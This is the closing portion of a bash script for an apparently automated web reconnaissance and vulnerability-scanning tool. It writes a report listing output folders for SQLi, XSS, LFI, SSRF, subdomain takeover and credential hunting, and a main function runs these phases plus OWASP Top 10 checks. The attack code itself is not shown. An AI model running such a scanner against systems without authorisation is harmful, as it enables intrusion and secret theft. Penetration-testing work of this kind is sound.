  )

  for f in "${vuln_files[@]}"; do
    if [[ -s "$f" ]]; then
      {
        echo ""
        echo "#### $(basename "$f" .txt)"
        echo "---BEGIN---"
        head -20 "$f"
        echo "---END---"
      } >> "$REPORT"
    fi
  done

  {
    echo ""
    echo "---"
    echo ""
    echo "## Directory Structure"
    echo ""
    echo "    mth_<domain>_<date>/ — Root output directory";
    echo "    01_subdomains/  — Subdomain enumeration"
    echo "    02_dns/         - DNS & ASN intelligence"
    echo "    03_portscan/    - Port scan results"
    echo "    04_webprobe/    - Live hosts, tech stack, headers"
    echo "    05_crawl/       - Crawled URLs"
    echo "    06_params/      - Parameter discovery"
    echo "    07_dirscan/     - Directory brute-forcing"
    echo "    08_javascript/  - JS analysis & secrets"
    echo "    09_sqli/        - SQLi tests"
    echo "    10_xss/         - XSS tests"
    echo "    11_lfi/         - LFI tests"
    echo "    12_ssrf/        - SSRF tests"
    echo "    13_redirect/    - Open redirect tests"
    echo "    14_cors/        - CORS tests"
    echo "    15_takeover/    - Subdomain takeover"
    echo "    16_nuclei/      - Nuclei broad scans"
    echo "    17_secrets/     - Credential hunting"
    echo "    19_cloud/       - Cloud infrastructure"
    echo "    20_wordpress/   - WordPress tests"
    echo "    99_report/               - This report"
    echo ""
    echo "## OWASP Top 10 — 2021 Coverage"
    echo ""
    echo "| ID  | Category                              | Output Dir                    |"
    echo "|-----|---------------------------------------|-------------------------------|"
    echo "| A01 | Broken Access Control                 | owasp_a01_access_control/     |"
    echo "| A02 | Cryptographic Failures                | owasp_a02_crypto/             |"
    echo "| A03 | Injection (SQLi+CMDi+SSTi+XXE+more)  | owasp_a03_injection/          |"
    echo "| A04 | Insecure Design                       | owasp_a04_insecure_design/    |"
    echo "| A05 | Security Misconfiguration             | owasp_a05_misconfig/          |"
    echo "| A06 | Vulnerable & Outdated Components      | owasp_a06_components/         |"
    echo "| A07 | Identification & Auth Failures        | owasp_a07_auth/               |"
    echo "| A08 | Software & Data Integrity Failures    | owasp_a08_integrity/          |"
    echo "| A09 | Security Logging & Monitoring         | owasp_a09_logging/            |"
    echo "| A10 | Server-Side Request Forgery (SSRF)    | owasp_a10_ssrf_ext/           |"
  } >> "$REPORT"

  log_ok "Report saved → $REPORT"
  separator
  echo -e "${BOLD}${GREEN}  ✓ Recon complete!${RESET}"
  echo -e "  ${CYAN}Output :${RESET} $OUTPUT_DIR"
  echo -e "  ${CYAN}Report :${RESET} $REPORT"
  echo ""
  echo -e "${BOLD}${RED}  === FINDINGS SUMMARY ===${RESET}"
  local found_any=false
  for f in "${vuln_files[@]}"; do
    [[ -s "$f" ]] && {
      found_any=true
      echo -e "  ${RED}[!]${RESET} $(wc -l < "$f") findings in $(basename "$f")"
    }
  done
  $found_any || echo -e "  ${GREEN}[+]${RESET} No definitive vulnerabilities confirmed (manual review recommended)"
  separator
}

# ─────────────────────────────────────────────
#  MAIN — Orchestrate all phases
# ─────────────────────────────────────────────
main() {
  banner
  parse_args "$@"
  setup_dirs
  check_dependencies

  phase_subdomains
  phase_dns
  phase_portscan
  phase_webprobe
  phase_crawl
  phase_params
  phase_dirscan
  phase_javascript
  phase_sqli
  phase_xss
  phase_lfi
  phase_ssrf
  phase_redirect
  phase_cors
  phase_takeover
  phase_nuclei
  phase_secrets
  phase_cloud
  phase_wordpress
  phase_additional

  # ── OWASP Top 10 — 2021 Full Coverage ──────────────
  if $RUN_OWASP; then
    owasp_a01_access_control
    owasp_a02_crypto
    owasp_a03_injection
    owasp_a04_insecure_design
    owasp_a05_misconfig
    owasp_a06_components
    owasp_a07_auth
    owasp_a08_integrity
    owasp_a09_logging
    owasp_a10_ssrf_extended
  fi

  phase_report
}

main "$@"
